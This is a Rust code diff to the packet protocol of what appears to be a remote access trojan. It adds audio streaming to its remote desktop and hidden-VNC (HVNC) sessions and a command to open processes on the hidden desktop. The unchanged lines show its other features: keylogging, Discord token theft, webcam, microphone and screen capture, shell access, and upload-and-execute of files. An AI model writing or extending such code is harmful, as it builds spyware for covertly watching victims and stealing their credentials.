@@ -19,6 +19,7 @@ pub enum ServerboundPacket {
     ScreenshotResult(ScreenshotData),
     WebcamResult(Vec<u8>),
     RemoteDesktopFrame(RemoteDesktopFrame),
+    RemoteDesktopAudioChunk(RemoteDesktopAudioChunk),
     ProcessList(ProcessList),
     ShellOutput(String),
     InputBoxResult(String),
@@ -30,6 +31,7 @@ pub enum ServerboundPacket {
     CurrentFolder(String),   
 
     HVNCFrame(Vec<u8>),
+    HVNCFrameAudioChunk(HVNCFrameAudioChunk),
 
     // Keylogger
     KeyloggerUpdate(KeyloggerUpdate),
@@ -73,6 +75,7 @@ impl Packet for ServerboundPacket {
             ServerboundPacket::ScreenshotResult(_) => "Screenshot Result",
             ServerboundPacket::WebcamResult(_) => "Webcam Result",
             ServerboundPacket::RemoteDesktopFrame(_) => "Remote Desktop Frame",
+            ServerboundPacket::RemoteDesktopAudioChunk(_) => "Remote Desktop Audio Chunk",
             ServerboundPacket::ProcessList(_) => "Process List",
             ServerboundPacket::ShellOutput(_) => "Shell Output",
             ServerboundPacket::InputBoxResult(_) => "Input Box Result",
@@ -81,6 +84,7 @@ impl Packet for ServerboundPacket {
             ServerboundPacket::FileList(_) => "File List",
             ServerboundPacket::CurrentFolder(_) => "Current Folder",
             ServerboundPacket::HVNCFrame(_) => "HVNC Frame",
+            ServerboundPacket::HVNCFrameAudioChunk(_) => "HVNC Frame Audio Chunk",
             ServerboundPacket::KeyloggerUpdate(_) => "Keylogger Update",
             ServerboundPacket::KeyloggerOfflineLogs(_) => "Keylogger Offline Logs",
             ServerboundPacket::MicDeviceList(_) => "Mic Device List",
@@ -117,6 +121,8 @@ pub enum ClientboundPacket {
     Disconnect,
     StartRemoteDesktop(RemoteDesktopConfig),
     StopRemoteDesktop,
+    StartRemoteDesktopAudio,
+    StopRemoteDesktopAudio,
     RequestMicDevices,
     RequestDiscordTokens,
     StartMicLive(String),
@@ -157,7 +163,10 @@ pub enum ClientboundPacket {
 
     StartHVNC,
     StopHVNC,
+    StartHVNCFrameAudio,
+    StopHVNCFrameAudio,
     OpenExplorer,
+    OpenHVNCProcess(String),
     
     UploadAndExecute(FileData),
     ExecuteFile(String),
@@ -209,6 +218,8 @@ impl Packet for ClientboundPacket {
             ClientboundPacket::Disconnect => "Disconnect",
                     ClientboundPacket::StartRemoteDesktop(_) => "Start Remote Desktop",
             ClientboundPacket::StopRemoteDesktop => "Stop Remote Desktop",
+            ClientboundPacket::StartRemoteDesktopAudio => "Start Remote Desktop Audio",
+            ClientboundPacket::StopRemoteDesktopAudio => "Stop Remote Desktop Audio",
             ClientboundPacket::RequestMicDevices => "Request Mic Devices",
             ClientboundPacket::RequestDiscordTokens => "Request Discord Tokens",
             ClientboundPacket::StartMicLive(_) => "Start Mic Live",
@@ -246,7 +257,10 @@ impl Packet for ClientboundPacket {
 
             ClientboundPacket::StartHVNC => "Start HVNC",
             ClientboundPacket::StopHVNC => "Stop HVNC",
+            ClientboundPacket::StartHVNCFrameAudio => "Start HVNC Frame Audio",
+            ClientboundPacket::StopHVNCFrameAudio => "Stop HVNC Frame Audio",
             ClientboundPacket::OpenExplorer => "Open Explorer",
+            ClientboundPacket::OpenHVNCProcess(_) => "Open HVNC Process",
             ClientboundPacket::UploadAndExecute(_) => "Upload And Execute",
             ClientboundPacket::ExecuteFile(_) => "Execute File",
             ClientboundPacket::UploadFile(_, _) => "Upload File",
@@ -320,6 +334,22 @@ pub struct RemoteDesktopFrame {
     pub data: Vec<u8>, // JPEG encoded image data
     pub width: usize,
     pub height: usize,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct RemoteDesktopAudioChunk {
+    pub timestamp: u64,
+    pub sample_rate: u32,
+    pub channels: u16,
+    pub data: Vec<u8>, // PCM i16 audio data
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct HVNCFrameAudioChunk {
+    pub timestamp: u64,
+    pub sample_rate: u32,
+    pub channels: u16,
+    pub data: Vec<u8>, // PCM i16 audio data
 }
 
 #[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
